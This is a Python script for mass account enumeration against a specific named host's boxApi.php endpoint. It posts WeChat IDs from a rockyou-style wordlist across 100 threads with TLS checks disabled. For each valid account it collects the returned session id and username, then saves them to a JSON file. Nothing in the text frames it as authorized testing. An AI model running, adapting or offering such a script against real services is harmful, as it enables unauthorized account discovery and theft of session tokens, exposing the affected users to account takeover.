#!/usr/bin/env python3
"""
Fast account enumeration using ffuf-compatible response analysis.
The server returns different response sizes for:
- Account found: ~87 bytes (contains sid + username)
- Account not found: ~55 bytes (status -1001)
This allows fast differentiation.
"""
import requests, urllib3, json, sys, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

# Direct socket-level connection pooling for max speed
import http.client
from urllib.parse import urlencode

TARGET_HOST = "apib63.bf1788.com"
TARGET_PATH = "/boxApi.php?cmd=1000"

def check_fast(wechat_id):
    """Use direct HTTP connection for faster enumeration."""
    conn = http.client.HTTPSConnection(TARGET_HOST, timeout=8, context=ssl._create_unverified_context())
    body = urlencode({
        "cmd": "1000",
        "wechatId": wechat_id,
        "sid": "",
        "vendorId": "test",
        "signature": "test",
        "site": "bfc",
        "lang": "tw"
    })
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        conn.request("POST", TARGET_PATH, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode('utf-8', errors='replace')
        # Check for account found (response contains "sid")
        if '"sid"' in data and '"username"' in data:
            import json as j
            try:
                d = j.loads(data)
                return wechat_id, d["msg"]["sid"], d["msg"]["username"]
            except:
                pass
    except:
        pass
    finally:
        conn.close()
    return None

if __name__ == "__main__":
    import ssl
    
    wordlist_path = sys.argv[1] if len(sys.argv) > 1 else "/tmp/rockyou_decoded.txt"
    num_workers = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    # Read wordlist
    print(f"[*] Loading wordlist: {wordlist_path}")
    with open(wordlist_path, "r", errors="ignore") as f:
        candidates = [line.strip() for line in f if line.strip() and len(line.strip()) <= 32]
    
    print(f"[*] Testing {len(candidates)} candidates with {num_workers} workers...")
    start = time.time()
    found = []
    completed = 0
    
    with ThreadPoolExecutor(max_workers=num_workers) as ex:
        futures = {ex.submit(check_fast, c): c for c in candidates}
        for future in as_completed(futures):
            completed += 1
            result = future.result()
            if result:
                found.append(result)
                print(f"[+] FOUND: {result[0]} -> sid={result[1]}, username={result[2]}", flush=True)
            if completed % 5000 == 0:
                elapsed = time.time() - start
                rate = completed / elapsed if elapsed > 0 else 0
                print(f"  [{completed}/{len(candidates)}] found={len(found)}, rate={rate:.0f}/s", flush=True)
    
    elapsed = time.time() - start
    print(f"\n[+] Done in {elapsed:.1f}s: {len(found)} accounts found ({len(found)/elapsed*60:.0f}/min rate)")
    
    if found:
        output = [{"wechatId": f[0], "sid": f[1], "username": f[2]} for f in found]
        with open("enumeration_results.json", "w") as f:
            json.dump(output, f, indent=2)
        print("[+] Saved to enumeration_results.json")
